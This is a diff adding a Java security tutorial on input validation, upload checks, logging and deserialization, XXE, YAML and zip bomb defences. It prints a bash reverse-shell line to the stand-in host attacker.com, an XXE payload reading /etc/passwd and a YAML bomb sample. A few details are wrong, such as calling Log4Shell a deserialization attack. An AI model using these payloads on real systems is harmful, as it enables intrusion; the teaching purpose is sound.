@@ -1,0 +1,859 @@
+# Core Application Security for Java Developers
+
+## Content
+
+- [Securing Resource Access via UUIDs](#securing-resource-access-via-uuids)
+  - [How to Generate UUIDs](#how-to-generate-uuids)
+- [Input Data Validation and Sanitization](#input-data-validation-and-sanitization)
+  - [Validation Techniques](#validation-techniques)
+  - [Sanitization Techniques](#sanitization-techniques)
+- [Handling Input Files from Public Sources or External Clients](#handling-input-files-from-public-sources-or-external-clients)
+- [Security Logging Best Practices](#security-logging-best-practices)
+- [Java Deserialization](#java-deserialization)
+  - [Java Deserialization Attack](#java-deserialization-attack)
+  - [XML External Entity (XXE)](#xml-external-Entity-xxe)
+  - [YAML Nested Anchors and Aliases](#yaml-nested-anchors-and-aliases)
+  - [Zip Bomb](#zip-bomb)
+- [Secure Configuration and Secrets Management](#secure-configuration-and-secrets-management)
+- [Keeping JDK Versions and Libraries Up to Date](#keeping-jdk-versions-and-libraries-up-to-date)
+- [References](#references)
+
+---
+
+🔒 This article is tailored for Java developers to understand the core mechanisms used to secure the Java process. It covers security measures that can be implemented internally after the service receives a request from an external client, focusing on areas such as securing resource access, input validation, secure configuration of secrets, logging, and deserialization vulnerabilities.
+
+📚 It is part of a series of security-related articles for Java developers. 
+I highly recommend checking out the others for a more comprehensive understanding:
+- **API Web Application Security for Java Developers**: Covers key security aspects to secure Java process APIs and how the Java process can enhance the security of web or single-page applications communicating with a Java backend.
+- **Security Application Testing for Java Developers**: Covers the main testing security tools that can be integrated to assess both statically and at runtime the flaws of the Java application.
+
+## Securing Resource Access via UUIDs
+
+Exposing internal resources to external clients via a [Universally Unique Identifier (UUID)](https://en.wikipedia.org/wiki/Universally_unique_identifier) makes it hard to guess or predict them. In contrast, sequential or simple IDs (e.g., `1`, `2`, `3`, etc.,) expose resources to enumeration attacks and increase the likelihood that an attacker could guess and randomly access unwanted resources.
+
+This is particularly important when exposing resources via RESTful APIs over HTTP to external clients.
+
+For example, for an API like:
+
+```
+  GET /pizza/orders/{orderId}
+```
+
+using a UUID format for the `orderId` URL parameter:
+
+```
+  GET /pizza/orders/e45042cf-e6aa-4e23-990f-8fbd8c83-610a
+```
+
+is much harder to guess compared to using a simple integer:
+
+```
+  GET /pizza/orders/123
+```
+
+Source: [API definition file](https://github.com/ionutbalosin/java-application-security-practices/blob/main/pizza-order-api/src/main/resources/service-api.yaml)
+
+While UUIDs typically require more storage space and add performance overhead, they provide a more secure method for identifying resources.
+
+### How to Generate UUIDs
+
+To generate UUIDs, there are multiple options, as described below:
+
+1. **At the application level**: UUIDs can be generated explicitly in the code by software engineers.
+
+For example, in Java, you can generate a version 4 UUID using the `java.util.UUID` class:
+
+```java
+  // Java
+  UUID orderId = UUID.randomUUID();
+```
+
+2. **At the database level**: Alternatively, and often more efficiently, if the resource is stored in a database, you can leverage database-generated UUIDs.
+
+Many modern databases, like PostgreSQL, can generate UUIDs natively. This approach can simplify your application code and ensure UUIDs are unique across your database.
+
+```
+  -- PostgreSQL
+  orderId UUID DEFAULT uuid_generate_v4()
+```
+
+## Input Data Validation and Sanitization
+
+These two concepts are fundamental when it comes to input data handling and can be defined as follows:
+
+1. **Validation**: Ensures the input meets expected formats and constraints (e.g., length, type, range, expected values, etc.).
+2. **Sanitization**: Modifies input to ensure it is safe for further processing (e.g., escaping or encoding special characters).
+
+### Validation Techniques
+
+Validation techniques become easier to implement in the case of RESTful APIs leveraging specifications like [OpenAPI](https://en.wikipedia.org/wiki/OpenAPI_Specification) or [Swagger](https://en.wikipedia.org/wiki/Swagger_(software)), since the DSL itself is rich and provides many validation criteria (e.g., `type`, `format`, `enum`, `minimum`, `maximum`, `minLength`, `maxLength`, `pattern`, etc.) that can be declared in the API definition, which is a significant advantage.
+
+You can then use an [OpenAPI Generator](https://github.com/OpenAPITools/openapi-generator) or [Swagger Codegen](https://github.com/swagger-api/swagger-codegen) to generate the models and interfaces, with all of these constraints included in the generated source code, in an API-Driven Development fashion, which I highly recommend.
+
+Below are the most important validation techniques.
+
+**Whitelisting**: Allows only valid, predefined input values. This approach is strongly recommended compared to blacklisting (see below).
+
+A few examples:
+
+- Let's suppose the user wants to upload some files via a web UI. In this case, whitelisting implies allowing only specific file types (e.g., `.txt`, `.json`) to be uploaded by a user, as in the configuration below:
+
+    ```properties
+      # Application properties
+      file.upload.allowed-extensions=txt,json
+    ```
+
+-  Another example is to use `enum` values instead of free-form strings as in the API definition below:
+
+    ```yaml
+      # OpenAPI definition
+      PizzaOrderStatus:
+        type: string
+        enum:
+          - initiated
+          - in_preparation
+          - in_delivery
+          - delivered
+    ```
+
+**Blacklisting**: In contrast to whitelisting, blacklisting blocks specific known bad inputs. It is less reliable and not recommended.
+
+- In the example above, blocking specific dangerous file types (e.g., `.exe`) from being uploaded is less secure as new or other types (e.g., malicious `.zip` files) may bypass the filter and endanger the system.
+
+    ```properties
+      # Application properties
+      file.upload.denied-extensions=exe
+    ```
+
+**Regular Expressions**: Use for pattern matching to enforce format constraints (e.g., emails, phone numbers).
+
+A few examples: 
+- Use an email regex for all email input fields in a web UI.
+- Use a phone number regex instead of a free-text input.
+
+In this API definition, you can see the regex patterns for both emails and phone numbers:
+
+```yaml
+  # OpenAPI definition
+  Customer:
+    type: object
+    properties:
+      email:
+        type: string
+        description: Email address of the customer.
+        maxLength: 128
+        # Email regex
+        pattern: ^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$
+        example: "john.doe@customer.com"
+      phoneNumber:
+        type: string
+        description: Phone number of the customer, including country code.
+        maxLength: 16
+        # Phone number regex
+        pattern: '^\+?\d{1,3}?[-.\s]?\(?\d{1,4}?\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}$'
+        example: "+4366412345678"
+```
+Source: [API definition file](https://github.com/ionutbalosin/java-application-security-practices/blob/main/pizza-order-api/src/main/resources/service-api.yaml)
+
+**Type Validation**: Ensure input matches the expected data types (e.g., numeric, date, etc.). Allowing everything to be a string might be too open-ended.
+
+**Range Validation**: For numbers or dates, ensure they are within acceptable ranges.
+
+**Length and Size Validation**: Prevent buffer overflows or excessively large input (e.g., limiting input length for fields). 
+This is especially important for arrays or free-form text where limiting the length or size is crucial.
+
+In this API definition, you can see the type, range, length, and size validation rules:
+
+```yaml
+  # OpenAPI definition
+  
+  Order:
+    type: object
+    properties:
+      orders:
+        # Type validation
+        type: array
+        # Size validation
+        minItems: 1
+        maxItems: 32
+        items:
+          $ref: '#/components/schemas/OrderItem'
+      customer:
+        $ref: '#/components/schemas/Customer'
+        
+  OrderItem:
+    type: object
+    properties:
+      quantity:
+        # Type validation
+        type: integer
+        description: Number of pizza being ordered.
+        example: 3
+        # Range validation
+        minimum: 1
+        maximum: 12
+
+  Customer:
+    type: object
+    properties:
+      specialRequest:
+        # Type validation
+        type: string
+        description: Special requests from the customer regarding their order.
+        # Length validation
+        maxLength: 1024
+        example: "I would like extra cheese and a thinner crust. I'm quite hungry, so please deliver it as soon as possible. I usually give extra tips."
+```
+
+Source: [API definition file](https://github.com/ionutbalosin/java-application-security-practices/blob/main/pizza-order-api/src/main/resources/service-api.yaml)
+
+### Sanitization Techniques
+
+Below are the most important sanitizations techniques.
+
+**Encoding Data**: Encode data to ensure it is safe for further processing and storage.
+
+A few examples:
+- HTML Encoding prevents [Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting) by encoding special characters like `<`, `>`, `&`, etc.
+- URL Encoding handles special characters in URLs (e.g., spaces, slashes).
+- Base64 Encoding converts binary data into a text format using a base 64 representation, allowing binary data (like images or PDF files) to be safely transmitted in text-based formats (e.g., JSON, XML).
+
+In this Java code snapshot, the user input is HTML encoded:
+
+```java
+  public void sanitizeSpecialRequest(Order order) {
+    ofNullable(order.getCustomer())
+      .map(Customer::getSpecialRequest) // Unsafe input
+      .map(HtmlUtils::htmlEscape)       // Encoded output
+      .ifPresent(sanitizedSpecialRequest ->
+        order.getCustomer().setSpecialRequest(sanitizedSpecialRequest));
+  }
+```
+
+**Escaping Special Characters**: Ensure special characters are properly escaped to prevent injection attacks (e.g., [SQL injection](https://en.wikipedia.org/wiki/SQL_injection), XSS).
+
+Example:
+- SQL Escaping prevents SQL injection by escaping special characters like single quotes. However, parameterized queries (i.e., prepared statements) are more secure, as they separate query logic from user input.
+
+In this Java code snapshot, the `org.springframework.jdbc.core.JdbcTemplate` is used to execute database queries:
+
+```java
+  private final JdbcTemplate jdbcTemplate;
+    
+  public void insertPizzaOrder(String customerName, String sanitizedSpecialRequest) {
+    // Parameterized queries to prevent SQL injection
+    final String query = "INSERT INTO orders (customer_name, special_request) VALUES (?, ?)";
+    jdbcTemplate.update(query, customerName, sanitizedSpecialRequest);
+  }
+```
+
+## Handling Input Files from Public Sources or External Clients
+
+> **Rule of thumb:** Assume that any input file from a public or external client source can be potentially malicious.
+
+Below are the most important factors to consider when dealing with files that are uploaded to our system by clients or users from the public internet.
+
+**Input Type Validation:** Validate file types and contents before processing to ensure they meet expected formats and predefined rules.
+
+**File Size Limits:** Enforce limits on input file sizes to prevent [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack) and resource exhaustion.
+
+**Sanitize File Names:** Avoid directly using untrusted file names. Sanitize the input to protect against [path traversal attacks](https://owasp.org/www-community/attacks/Path_Traversal) (e.g., `/var/www/reports/../../../etc/passwd`).
+
+**Scan for Malware:** Integrate malware scanning solutions for files that may be malicious (e.g., user uploads) to detect and mitigate potential threats.
+Note that the integration with a malware SaaS is out of scope for this article.
+
+Below are the basic configuration properties for file uploads:
+
+```properties
+  # Application properties
+  file.upload.max-size=15728640
+  file.upload.max-filename-length=255
+  file.upload.allowed-extensions=txt,json
+```
+
+And the Java source code that implements the input file checks:
+
+```java
+    @Service
+    public class UploadFileValidator {
+    
+      private static final String CURRENT_DIR = System.getProperty("user.dir", ".");
+    
+      @Value("${file.upload.max-size}")
+      private Integer fileMaxSize;
+    
+      @Value("${file.upload.max-filename-length}")
+      private Integer fileNameMaxLength;
+    
+      @Value("#{'${file.upload.allowed-extensions}'.split(',')}")
+      private Set<String> allowedExtensions;
+    
+      private final Tika tika;
+    
+      public UploadFileValidator() {
+        this.tika = new Tika();
+      }
+    
+      /**
+       * This method checks whether the uploaded file meets specific criteria such as size, name length,
+       * allowed file extensions, and valid MIME type (JSON or plain text).
+       */
+      public void validate(MultipartFile uploadFile) {
+        final String filename = uploadFile.getOriginalFilename();
+    
+        validateFilenameLength(filename);
+        validateFileExtension(filename);
+        validateFileSize(uploadFile, filename);
+        validateFileMimeType(uploadFile, filename);
+        validatePathTraversal(filename);
+      }
+    
+      private void validateFileSize(MultipartFile uploadFile, String filename) {
+        if (uploadFile.getSize() > fileMaxSize) {
+          throw new SecurityException(
+              format(
+                  "File size %s (bytes) is larger than the allowed size %s (bytes).",
+                  uploadFile.getSize(), fileMaxSize));
+        }
+    
+        if (uploadFile.getSize() == 0) {
+          throw new SecurityException(format("File %s is empty.", filename));
+        }
+      }
+    
+      private void validateFilenameLength(String filename) {
+        if (filename == null || filename.length() > fileNameMaxLength) {
+          throw new SecurityException(
+              format(
+                  "File name length %s exceeds the maximum allowed length of %s.",
+                  filename.length(), fileNameMaxLength));
+        }
+      }
+    
+      private void validateFileExtension(String filename) {
+        final String fileExtension = getFileExtension(filename);
+        if (!allowedExtensions.stream()
+            .anyMatch(allowedExtension -> fileExtension.equalsIgnoreCase(allowedExtension))) {
+          throw new SecurityException(format("File extension %s is not allowed.", fileExtension));
+        }
+      }
+    
+      private void validateFileMimeType(MultipartFile uploadFile, String filename) {
+        try {
+          final String mimeType = tika.detect(uploadFile.getInputStream());
+          if (!mimeType.equals("application/json") && !mimeType.equals("text/plain")) {
+            throw new SecurityException(format("File MIME type %s is not allowed.", mimeType));
+          }
+        } catch (IOException e) {
+          throw new RuntimeException(e);
+        }
+      }
+    
+      /**
+       * Validates the specified filename to prevent path traversal attacks.
+       *
+       * <p>This method checks whether the canonical path of the given filename starts with the base
+       * directory's canonical path. If it does not, this may indicate a potential path traversal
+       * attempt, and access to files outside the intended directory structure is denied.
+       *
+       * <p>Path Traversal Attack Example:
+       *
+       * <p>Suppose CURRENT_DIR is "/uploads". A malicious user could attempt to access sensitive files
+       * by providing the following filename: "../../etc/passwd".
+       */
+      private void validatePathTraversal(String filename) {
+        try {
+          final File file = new File(CURRENT_DIR, filename);
+          final String canonicalPath = file.getCanonicalPath();
+          final String baseCanonicalPath = new File(CURRENT_DIR).getCanonicalPath();
+    
+          if (!canonicalPath.startsWith(baseCanonicalPath)) {
+            throw new SecurityException(
+                format(
+                    "Path traversal detected for filename: %s. Access to the file is not allowed.",
+                    filename));
+          }
+    
+        } catch (IOException e) {
+          throw new RuntimeException("Error while validating file path: " + e.getMessage(), e);
+        }
+      }
+    
+      private String getFileExtension(String fileName) {
+        return ofNullable(fileName)
+            .filter(name -> name.contains("."))
+            .map(name -> name.substring(name.lastIndexOf(".") + 1))
+            .orElseThrow(
+                () ->
+                    new RuntimeException(
+                        format("Could not identify file extension for '%s'", fileName)));
+      }
+    }
+
+```
+
+Source: [UploadFileValidator.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/pizza-order-service/src/main/java/ionutbalosin/training/application/security/practices/pizza/order/service/validator/UploadFileValidator.java)
+
+The [Apache Tika](https://tika.apache.org) library is used to detect if the uploaded file type corresponds to the file content itself.
+
+## Security Logging Best Practices
+
+**Avoid Logging Sensitive Data:** Never log [Personally Identifiable Information (PII)](https://www.investopedia.com/terms/p/personally-identifiable-information-pii.asp) or Payment Information (PI).
+If necessary, mask or encrypt it to comply with regulations (e.g., [General Data Protection Regulation](https://gdpr-info.eu/)). 
+
+A few examples of logs that contain sensitive PI/PII data and should therefore be avoided:
+
+```
+  ❌ 08:15:22.123 INFO User registration successful with email: john.doe@keycloak.com
+  ❌ 09:17:22.476 INFO Payment processed successfully for Card Number: 1111-2222-3333-4444, Expiry Date: 12/31, CVV: 123, with Amount: €100.00
+  ❌ 10:06:29.476 INFO User john.doe@keycloak.com updated their profile: 123 Main St, Vienna, Austria, Phone Number: (664) 123-456-789
+```
+
+A few examples of logs that do not contain sensitive PI/PII data and are therefore acceptable:
+
+```
+  ✅ 08:15:22.476 INFO User registration successful for user ID f47ac10b-58cc-4372-a567-0e02b2c3d479
+  ✅ 09:17:22.678 INFO Payment processed successfully for Card Number: [MASKED, ****-****-****-4444], Expiry Date: 12/31, CVV: [MASKED, ***], with Amount: €100.00
+  ✅ 10:06:29.451 INFO User ID f47ac10b-58cc-4372-a567-0e02b2c3d479 updated their profile successfully. New address: [MASKED, Vienna, Austria], Phone Number: [MASKED, (664) 123-***-***]
+```
+
+**Include Contextual Logging Information:** Log details such as remote host, remote port, user ID, resource accessed, user agent, etc. for better analysis.
+
+Especially when dealing with requests from external public clients, particularly via RESTful APIs over HTTP calls, it is crucial to log key request details.In case of an attack, you need to identify where the request came from, who initiated the request, and what resource was affected in our system by that request.
+
+A few examples of logs containing security contextual information are:
+
+```
+  06:01:39.476 [http-nio-8080-exec-2] [RemoteHost=192.168.65.1, RemotePort=30888, UserId=720a2f16-de10-4dd3-84cd-1b9424c3ad48, RequestMethod=POST, UserAgent=PostmanRuntime/7.33.0, RequestURI=/pizza/orders] INFO Pizza order '2504107a-d474-44c8-aae2-91abb577b9b8' has been successfully sent for cooking.
+  06:01:40.947 [http-nio-8080-exec-1] [RemoteHost=172.29.0.4, RemotePort=56226, UserId=c5c9f9af-d95c-4816-b9ad-d21c4da76463, RequestMethod=POST, UserAgent=Java/21.0.5, RequestURI=/pizza/delivery/orders] INFO Pizza order 'f39fba32-ce86-4021-a236-e21b4ffdbfc5' has been successfully delivered.
+```
+
+The best way to automatically incorporate these additional security parameters is to use the logger's [Mapped Diagnostic Context (MDC)](https://logback.qos.ch/manual/mdc.html) in an HTTP request handler interceptor. This ensures that all application requests pass through it and that the parameters are automatically available to the logger.
+
+The code snapshot below is an example of how such an HTTP request handler interceptor could be configured to set the MDC values.
+
+```java
+  /**
+   * This class effectively captures critical information such as the remote host, user ID,
+   * correlation ID, HTTP request method, HTTP request URI, user agent, and response status. This
+   * information is essential for tracking user actions, identifying potential security issues, and
+   * troubleshooting. It stores this data in the Mapped Diagnostic Context (MDC), providing context in
+   * log outputs, facilitating traceability, and enhancing the overall observability of the
+   * application.
+   */
+  @Component
+  public class LoggerInterceptor implements HandlerInterceptor {
+
+    private static final String REMOTE_HOST = "RemoteHost";
+    private static final String REMOTE_PORT = "RemotePort";
+    private static final String USER_ID = "UserId";
+    private static final String CORRELATION_ID = "CorrelationId";
+    private static final String REQUEST_METHOD = "RequestMethod";
+    private static final String REQUEST_URI = "RequestURI";
+    private static final String USER_AGENT = "UserAgent";
+    private static final String RESPONSE_STATUS = "ResponseStatus";
+
+    @Override
+    public boolean preHandle(
+      HttpServletRequest request, HttpServletResponse response, Object handler) {
+      // Add the remote host
+      final String remoteHost = request.getRemoteAddr();
+      MDC.put(REMOTE_HOST, remoteHost);
+    
+      // Add the remote port
+      final String remotePort = String.valueOf(request.getRemotePort());
+      MDC.put(REMOTE_PORT, remotePort);
+    
+      // Add the user ID
+      final String userId =
+      (request.getUserPrincipal() != null) ? request.getUserPrincipal().getName() : "anonymous";
+      MDC.put(USER_ID, userId);
+    
+      // Add the correlation ID
+      String correlationId = request.getHeader(CORRELATION_ID);
+      if (correlationId == null || correlationId.isEmpty()) {
+        correlationId = UUID.randomUUID().toString();
+      }
+      MDC.put(CORRELATION_ID, correlationId);
+    
+      // Add the request method
+      String requestMethod = request.getMethod();
+      MDC.put(REQUEST_METHOD, requestMethod);
+    
+      // Add the HTTP request URI
+      String requestURI = request.getRequestURI();
+      MDC.put(REQUEST_URI, requestURI);
+    
+      // Add the user agent
+      String userAgent = request.getHeader("User-Agent");
+      MDC.put(USER_AGENT, userAgent != null ? userAgent : "unknown");
+    
+      return true;
+    }
+  }
+```
+
+Source: [LoggerInterceptor.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/security-slf4j-logger-enricher/src/main/java/ionutbalosin/training/application/security/practices/slf4j/logger/enricher/LoggerInterceptor.java)
+
+Of course, managing the MDC logger within the HTTP request handler interceptor applied to every incoming request will impact application performance. However, for critical or mission-critical systems that are publicly exposed, identifying and mitigating external attacks is crucial, and this approach pays off.
+
+**Monitor for Anomalies:** Set up monitoring to detect unusual activities, such as repeated failed logins or transactions from different regions. **Security Information and Event Management (SIEM)** systems are very helpful for this purpose.
+However, this topic is beyond the scope of this article, as implementing a SIEM is typically done at a higher level, usually company-wide.
+
+## Java Deserialization
+
+While Java deserialization attacks are not the most common security threats, they can dramatically harm the application if successfully executed.
+
+### Java Deserialization Attack
+
+An example of a classical Java deserialization attack is when an attacker creates a malicious class (e.g., `MaliciousClazz`) containing a harmful `readObject()` method. 
+
+[![Remote Code Execution with Java Deserialization.svg](images/remote_code_execution.svg)](images/remote_code_execution.svg)
+
+When the `MaliciousClazz` is deserialized, the `readObject()` method is executed, causing harmful actions on the attacker's machine.
+
+The malicious Java payload can reach the server through various mechanisms, including HTTP requests/responses, file uploads, third-party libraries, inter-service communication, configuration files, and more.
+
+The code snapshot below provides an example of such a malicious class.
+
+```java
+  public class MaliciousClazz implements Serializable {
+    
+    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+      ois.defaultReadObject();
+
+      // Attacker crafts a malicious command to be executed 💀
+      String maliciousCommand = "/bin/bash -c 'exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'";
+      Runtime.getRuntime().exec(maliciousCommand);
+    }
+  }
+```
+
+For example, the [Log4j Log4Shell vulnerability](https://en.wikipedia.org/wiki/Log4Shell) was essentially a Java deserialization attack that allowed a remote attacker to gain control over the victim's machine.
+
+### How to Mitigate or Prevent Java Deserialization Attacks
+
+Deserializing Java classes from external sources can be extremely dangerous. Similar to handling external input files, you must assume that any deserialized class from a public or external client source can potentially be malicious.
+
+Let's look at this example. Suppose an attacker extends one of the application's classes (e.g., `TrustedClazz`) with a malicious version (e.g., `MaliciousClazz`) and sends it to the server.
+
+```java
+  // A trusted class, generally created by application developers or a trusted third-party library owner
+  public class TrustedClazz implements Serializable {
+    // ...
+  }
+
+  // A malicious class typically created by the attacker
+  public class MaliciousClazz extends TrustedClazz {
+    
+    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+      ois.defaultReadObject();
+       
+      // Attacker crafts a malicious command to be executed 💀
+      String maliciousCommand = "...";
+      Runtime.getRuntime().exec(maliciousCommand);
+    }
+  }
+```
+
+When `TrustedClazz` is deserialized on the server, the `readObject()` method of `MaliciousClazz` is executed as well (as part of the class hierarchy), causing harmful actions on the attacker's machine.
+
+```java
+  try (final ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
+    final TrustedClazz trustedClazz = (TrustedClazz) ois.readObject();
+    // The malicious command is not executed anymore 💀
+  } catch (IOException | ClassNotFoundException e) {
+    // ...
+  }
+```
+
+The default deserialization mechanism does not prevent the deserialization of malicious classes because the JVM runtime lacks contextual information.
+However, there are two useful alternatives to mitigate or prevent this:
+
+1. **Deserialize using the Java input filter:** Restrict deserialization to only known, trusted or expected classes, thereby preventing any other unknown and potentially malicious classes from being deserialized.
+  This mechanism was introduced with [JEP 290: Filter Incoming Serialization Data](https://openjdk.org/jeps/290) and further enhanced by [JEP 415: Context-Specific Deserialization Filters](https://openjdk.org/jeps/415)
+
+    ```java
+      try (final ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
+      // Create a filter that allows deserialization of TrustedClazz class and rejects all others.
+      // The filter string format: <class name>;!* (allow TrustedClazz, reject all other classes).
+        final ObjectInputFilter filesOnlyFilter = ObjectInputFilter.Config.createFilter(TrustedClazz.class.getName() + ";!*");
+        ois.setObjectInputFilter(filesOnlyFilter);
+        // Deserialize the object, expecting it to be of type TrustedClazz
+        final TrustedClazz trustedClazz = (TrustedClazz) ois.readObject();
+        // The malicious command is not executed anymore ✅
+      } catch (IOException | ClassNotFoundException e) {
+        // ...
+      }
+    ```
+
+2. **Deserialize using Apache Commons validation library**
+
+    ```java
+      try (final FileInputStream fis = new FileInputStream(filename);
+      final ValidatingObjectInputStream vois = new ValidatingObjectInputStream(fis)) {
+        // Only allow specific trusted classes (e.g., TrustedClazz) to be deserialized
+        vois.accept(TrustedClazz.class);
+        // Deserialize the object (only allowed classes can be deserialized)
+        final TrustedClazz trustedClazz = (TrustedClazz) vois.readObject();
+        // The malicious code does not run anymore ✅ 
+      } catch (IOException | ClassNotFoundException e) {
+        // ...
+      }
+    ```
+
+Source: [MaliciousClazzDeserializer.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/java/ionutbalosin/training/application/security/practices/serialization/deserialization/clazz/MaliciousClazzDeserializer.java)
+
+### Key Takeaways
+
+- Avoid deserializing data from untrusted or unknown sources.
+- Restrict which classes can be deserialized using filters. In JDK 9 and later, use `ObjectInputFilter` to specify allowed objects. Additionally, libraries like `Apache Commons` provide mechanisms to define rules for allowed objects during deserialization.
+
+## XML External Entity (XXE)
+
+An XML External Entity (XXE) attack occurs when an application processes XML input containing a reference to an external entity using a weakly configured XML parser.
+
+For example, let's imagine your Java application receives the following XML file as input from an attacker:
+
+```xml
+  <?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+  <foo>&xxe;</foo>
+```
+
+Source: [xml_external_entity.xml](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/resources/xml_external_entity.xml)
+
+This is extremely dangerous because the XXE reference allows reading the sensitive `/etc/passwd` file on the victim machine.
+
+**Note:** Historically, many Java XML parsers have XXE enabled by default, which can make them vulnerable to XXE injection attacks. However, it's important to check the specific parser and version you are using, as newer versions may have addressed this issue by disabling XXE processing by default.
+
+Below is a code snapshot example using the `SAXParser`, that has XXE enabled by default.
+
+```java
+  final SAXParserFactory factory = SAXParserFactory.newInstance();
+  final XMLReader saxReader = factory.newSAXParser().getXMLReader();
+
+  // Parse the XML file
+  try (InputStream is = new FileInputStream(filename)) {
+    // XXE attack could lead to leakage of sensitive information 💀
+    saxReader.parse(new InputSource(is));
+  }
+```
+
+### How to Mitigate or Prevent XXE Attacks
+
+The safest way to prevent XXE attacks is to **completely disable DTDs and external entities**.
+
+```java
+  final SAXParserFactory factory = SAXParserFactory.newInstance();
+  // Disable DTDs and external entities for XXE protection
+  factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+  factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false); 
+  
+  final XMLReader saxReader = factory.newSAXParser().getXMLReader();
+
+  // Parse the XML file
+  try (InputStream is = new FileInputStream(filename)) {
+    // XXE attack is prevented ✅
+    saxReader.parse(new InputSource(is));
+  }
+```
+
+Source: [XmlXxeDeserializer.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/java/ionutbalosin/training/application/security/practices/serialization/deserialization/xml/XmlXxeDeserializer.java)
+
+## YAML Nested Anchors and Aliases
+
+YAML anchors (`&`) and aliases (`*`) allow a value defined elsewhere in the document to be reused, enabling a YAML file to contain deeply nested structures.
+
+By exploiting this mechanism, an attacker could create a deeply nested structure of references that, while being parsed by the application, may consume excessive CPU or memory, potentially causing the application to crash or become temporarily unavailable. This makes it a potential vector for denial-of-service (DoS) attacks.
+
+An example of a YAML file containing deeply nested references is shown below:
+
+```yaml
+  a: &a [_, _, _, ...]
+  b: &b [*a, *a, *a, ...]
+  c: &c [*b, *b, *b, ...]
+  d: &d [*c, *c, *c, ...]
+  # ...
+  z: &z [*y, *y, *y, ...]
+
+  user:
+    - firstname: Luna
+      lastname: Skywalker
+      username: luna_sky99
+      comment: Aspiring space traveler and coffee lover
+    - firstname: Bomb
+      lastname: Hunter
+      username: crack_the_heap
+      metadata: *z
+```
+
+Source: [yaml_bomb.yaml](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/resources/yaml_bomb.yaml)
+
+`SnakeYAML` is the most common and widely used library for parsing YAML in Java.
+However, be careful, because versions of `SnakeYAML` prior to `1.26` are susceptible to the YAML bomb vulnerability. Starting from version `1.26`, this type of attack is prevented, as the library imposes a limit on the depth of nested structures.
+
+To load the content of a YAML file using the `SnakeYAML` library, the code generally looks like this:
+
+```java
+  try (InputStream inputStream = new BufferedInputStream(new FileInputStream(CLASS_FILENAME))) {
+    final Yaml yaml = new Yaml();
+    final Map<String, Object> data = yaml.load(inputStream);
+    // YAML bomb might be triggered here 💀
+    final List<User> users = (List<User>) data.get("user");
+    // ...
+  } catch (IOException e) {
+    // ...
+  } 
+```
+
+Source: [YamlBombDeserializer.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/java/ionutbalosin/training/application/security/practices/serialization/deserialization/yaml/YamlBombDeserializer.java)
+
+### How to Mitigate or Prevent YAML bomb
+
+While parsing YAML files, it is important to check if the library you are using has a default limit on the depth of nested structures. If the library does not have such a limit, you should manually impose a limit on the depth of nested anchors to prevent deeply recursive structures.
+
+## Zip Bomb
+
+A zip bomb is an apparently small, maliciously crafted zip file (e.g., a few kilobytes) that expands to a massively larger size when decompressed (e.g., gigabytes or even terabytes). 
+Some zip bombs can even evade antivirus detection due to the way they are crafted.
+
+When reading, parsing, or extracting a zip file in a Java application, it is important to enforce strict limits to prevent potential zip bombs from crashing your application. These safeguards could include:
+- Restricting the maximum uncompressed size.
+- Limiting the number of zip entries.
+- Controlling the nesting depth for recursive extraction.
+
+The Java code snapshot below shows how these limits could be implemented:
+
+```java
+  private static final long MAX_UNCOMPRESSED_SIZE = 1024 * 1024 * 1024; // Max allowed uncompressed size (1 GB)
+  private static final int MAX_ENTRIES = 10_000; // Max allowed entries
+  private static final int MAX_NESTING_DEPTH = 20; // Max allowed nesting depth
+
+  public static void extractZipFile(File file, int depth) throws IOException {
+    if (depth > MAX_NESTING_DEPTH) {
+      throw new IOException("Max zip nesting depth exceeded. Possible zip bomb!");
+    }
+
+    try (ZipFile zipFile = new ZipFile(file)) {
+      final Enumeration<? extends ZipEntry> entries = zipFile.entries();
+      long totalUncompressedSize = 0;
+      int entryCount = 0;
+
+      while (entries.hasMoreElements()) {
+        ZipEntry entry = entries.nextElement();
+
+        if (entryCount++ > MAX_ENTRIES) {
+          throw new IOException("Max zip entries exceeded. Possible zip bomb!");
+        }
+
+        if (!entry.isDirectory()) {
+          long entrySize = entry.getSize();
+          if (entrySize < 0) {
+            entrySize = 0;
+          }
+          totalUncompressedSize += entrySize;
+
+          if (totalUncompressedSize > MAX_UNCOMPRESSED_SIZE) {
+            throw new IOException("Max uncompressed zip size exceeded. Possible zip bomb!");
+          }
+
+          if (entry.getName().endsWith(".zip")) {
+            final File nestedZip = new File(entry.getName());
+            try (InputStream is = zipFile.getInputStream(entry)) {
+              Files.copy(is, nestedZip.toPath());
+            }
+            try {
+              extractZipFile(nestedZip, depth + 1);
+            } finally {
+              // Ensure cleanup in case of failure
+              nestedZip.delete();
+            }
+          } else {
+            // Extracting zip entry, simulate reading
+            // ...
+            }
+          }
+        }
+      }
+    }
+  }
+```
+
